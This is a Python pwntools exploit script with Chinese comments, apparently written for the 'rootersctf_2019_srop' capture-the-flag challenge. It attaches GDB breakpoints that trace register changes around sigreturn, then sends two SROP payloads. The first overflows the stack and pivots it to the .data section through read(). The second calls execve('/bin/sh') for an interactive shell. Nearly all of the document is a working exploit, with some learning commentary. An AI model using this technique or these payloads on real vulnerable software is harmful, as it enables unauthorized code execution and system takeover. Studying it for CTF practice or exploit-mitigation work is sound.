#!/usr/bin/env python3
"""
SROP 调试脚本 — 单步跟到 sigreturn 前后，看清每个寄存器变化
"""

from pwn import *
context(os='linux', arch='amd64', log_level='info')

POP_RAX = 0x401032    # pop rax; syscall; leave; ret
SYSCALL = 0x401033    # syscall; leave; ret
DATA    = 0x402000    # .data 段（固定地址，可写）

# ============================================================
# Step 1：先启动程序，看反汇编确认结构
# ============================================================
print("=" * 60)
print("Step 1: 反汇编确认 gadget")
print("=" * 60)
elf = ELF('./rootersctf_2019_srop')
print(f"[*] pop_rax gadget @ {hex(POP_RAX)}")
print(f"[*] syscall gadget  @ {hex(SYSCALL)}")
print(f"[*] .data 段        @ {hex(DATA)}")
print(f"[*] 保护: NX=ON, PIE=OFF, Canary=OFF")
print()

# ============================================================
# Step 2: GDB 附加，断在关键位置
# ============================================================
p = gdb.debug('./rootersctf_2019_srop', '''
# 断点 1：read 返回后（确认溢出成功）
# 断点 2：pop_rax gadget（确认 ret 到这里了）
# 断点 3：sigreturn 前后（看寄存器变化）
# 断点 4：第二轮 read（确认 /bin/sh 写到 data 段）

# ---- 找到 read syscall 的位置 ----
# 程序代码很短，read 的 syscall 就在 gadget 前面
# 直接在 pop_rax gadget 设断点

b *0x401032
    commands 1
    silent
    printf "\\n[GDB] ★ 到达 pop_rax gadget\\n"
    printf "[GDB] 当前 rax=%lx rsp=%lx rip=%lx\\n", $rax, $rsp, $rip
    # 看一下栈顶（接下来要 pop 到 rax 的值）
    printf "[GDB] 栈顶 (要 pop 的值) = %lx\\n", *(unsigned long long*)$rsp
    continue
end

# ---- syscall 断点（在 pop_rax 后面）----
# pop_rax 之后: syscall; leave; ret
# 断在 syscall 上，如果是 rax=15 就是 sigreturn
b *0x401033
    commands 2
    silent
    if $rax == 0xf
        printf "\\n[GDB] ★★★ SROP! syscall rt_sigreturn (rax=15) ★★★\\n"
        printf "[GDB] sigreturn 前:\\n"
        printf "  rax=0x%lx rdi=0x%lx rsi=0x%lx rdx=0x%lx\\n", $rax, $rdi, $rsi, $rdx
        printf "  rsp=0x%lx, 栈顶处=0x%lx\\n", $rsp, *(unsigned long long*)$rsp
        # 打印 sigframe 的前 32 字节（pretcode + uc_flags）
        printf "  sigframe[0:8]  (pretcode) = 0x%lx\\n", *(unsigned long long*)$rsp
        printf "  sigframe[8:16] (uc_flags) = 0x%lx\\n", *(unsigned long long*)($rsp+8)
        # rax 在 sigframe 里的偏移 = 0xa0
        printf "  sigframe[raxf] (sf.rax)      = 0x%lx\\n", *(unsigned long long*)($rsp+0xa0)
        printf "  sigframe[ripf] (sf.rip)      = 0x%lx\\n", *(unsigned long long*)($rsp+0xa8)
        printf "  sigframe[rspf] (sf.rsp)      = 0x%lx\\n", *(unsigned long long*)($rsp+0xc0)
        printf "  sigframe[rdif] (sf.rdi)      = 0x%lx\\n", *(unsigned long long*)($rsp+0x70)
        printf "  sigframe[rsif] (sf.rsi)      = 0x%lx\\n", *(unsigned long long*)($rsp+0x78)
        printf "  sigframe[rdxf] (sf.rdx)      = 0x%lx\\n", *(unsigned long long*)($rsp+0x88)
    else
        printf "\\n[GDB] syscall rax=0x%lx (rdi=0x%lx rsi=0x%lx rdx=0x%lx)\\n", $rax, $rdi, $rsi, $rdx
    end
    continue
end

# ---- 在 syscall 之后断（看 sigreturn 效果）----
# gadget 是 "syscall; leave; ret" 三个指令
# syscall 后 rip = 下一条指令(leave)，rsp-rbp-rax 都变了
b *0x401036 if $rax == 0xf
    commands 3
    silent
    printf "\\n[GDB] ★ sigreturn 刚刚执行完毕！★\\n"
    printf "[GDB] sigreturn 后寄存器:\\n"
    printf "  rax=0x%lx rdi=0x%lx rsi=0x%lx rdx=0x%lx\\n", $rax, $rdi, $rsi, $rdx
    printf "  rip=0x%lx rsp=0x%lx rbp=0x%lx\\n", $rip, $rsp, $rbp
    continue
end

# ---- 第二轮 syscall（read 返回，execve 执行）----
b *0x401033 if $rax == 59
    commands 4
    silent
    printf "\\n[GDB] ★★★ 第二轮 SROP! syscall execve rax=59 ★★★\\n"
    printf "[GDB] rdi (filename): 0x%lx -> \\"%s\\"\\n", $rdi, (char*)$rdi
    printf "[GDB] rsi (argv): 0x%lx, rdx (envp): 0x%lx\\n", $rsi, $rdx
    continue
end

# 继续执行到第一轮溢出
continue
''')

# ============================================================
# Step 3: 构造并发送两轮 SROP payload
# ============================================================
print("=" * 60)
print("Step 3: 构造 Round 1 — SROP → read(0, DATA, 0x400)")
print("=" * 60)

f1 = SigreturnFrame()
f1.rax = constants.SYS_read      # syscall 0 = read
f1.rdi = 0                       # fd = stdin
f1.rsi = DATA                    # buf = 0x402000
f1.rdx = 0x400                   # count = 1024
f1.rip = SYSCALL                 # sigreturn 后从 syscall 继续
f1.rbp = DATA + 0x200            # 新栈基址
f1.rsp = DATA + 0x200            # ★ 新栈顶（在 data 段）

print(f"SigreturnFrame #1:")
print(f"  rax={f1.rax} (read)")
print(f"  rdi={f1.rdi}, rsi={hex(f1.rsi)}, rdx={hex(f1.rdx)}")
print(f"  rip={hex(f1.rip)}, rsp={hex(f1.rsp)}")
print(f"  sigframe 大小: {len(bytes(f1))} bytes")

# 发送溢出 payload
payload1  = b"A" * 0x80          # 填充到 ret_addr
payload1 += p64(0)               # fake rbp
payload1 += p64(POP_RAX)         # ret → pop_rax gadget
payload1 += p64(constants.SYS_rt_sigreturn)  # rax = 15 (sigreturn)
payload1 += bytes(f1)            # sigframe (248 bytes)

print(f"  payload1 长度: {len(payload1)} bytes")
print(f"  [0x00:0x80] = 'A'*0x80  (溢出填充)")
print(f"  [0x80:0x88] = {p64(0).hex()} (假 rbp)")
print(f"  [0x88:0x90] = {p64(POP_RAX).hex()} (ret → pop_rax)")
print(f"  [0x90:0x98] = {p64(15).hex()} (pop → rax=15)")
print(f"  [0x98:...]  = sigframe ({len(bytes(f1))} bytes)")

p.send(payload1)
print("  ✓ 已发送 payload1")

# ============================================================
# Step 4: 第二轮 — SROP → execve("/bin/sh", 0, 0)
# ============================================================
print()
print("=" * 60)
print("Step 4: 构造 Round 2 — SROP → execve('/bin/sh', 0, 0)")
print("=" * 60)

f2 = SigreturnFrame()
f2.rax = constants.SYS_execve    # syscall 59 = execve
f2.rdi = DATA                    # filename = 0x402000 (这里存 "/bin/sh")
f2.rsi = 0                       # argv = NULL
f2.rdx = 0                       # envp = NULL
f2.rip = SYSCALL                 # execve 后不需要回来

print(f"SigreturnFrame #2:")
print(f"  rax={f2.rax} (execve)")
print(f"  rdi={hex(f2.rdi)} (指向 '/bin/sh')")
print(f"  rsi={f2.rsi}, rdx={f2.rdx}")
print(f"  rip={hex(f2.rip)}")

# 写到 DATA 的布局:
#   [0x000:0x200] "/bin/sh\0" + padding
#   [0x200:0x210] fake rbp (8 bytes)
#   [0x210:0x218] ret → pop_rax gadget (8 bytes)
#   [0x218:0x220] rax = 15 (8 bytes)
#   [0x220:...]   sigframe2 (248 bytes)

payload2  = b"/bin/sh\x00".ljust(0x200, b"\x00")   # 前 0x200 放 "/bin/sh"
payload2 += p64(0)                                  # fake rbp
payload2 += p64(POP_RAX)                            # ret addr
payload2 += p64(constants.SYS_rt_sigreturn)         # rax=15
payload2 += bytes(f2)                               # sigframe

print(f"  payload2 长度: {len(payload2)} bytes")
print(f"  写入 DATA(0x402000):")
print(f"    [0x000:0x200] = '/bin/sh\\x00' + padding")
print(f"    [0x200:0x208] = {p64(0).hex()} (假 rbp)")
print(f"    [0x208:0x210] = {p64(POP_RAX).hex()} (ret)")
print(f"    [0x210:0x218] = {p64(15).hex()} (rax=15)")
print(f"    [0x218:...]   = sigframe2 ({len(bytes(f2))} bytes)")

p.send(payload2)
print("  ✓ 已发送 payload2")

# ============================================================
# Step 5: 拿 shell！
# ============================================================
print()
print("=" * 60)
print("Step 5: 如果一切正常，应该拿到 shell")
print("=" * 60)
p.interactive()
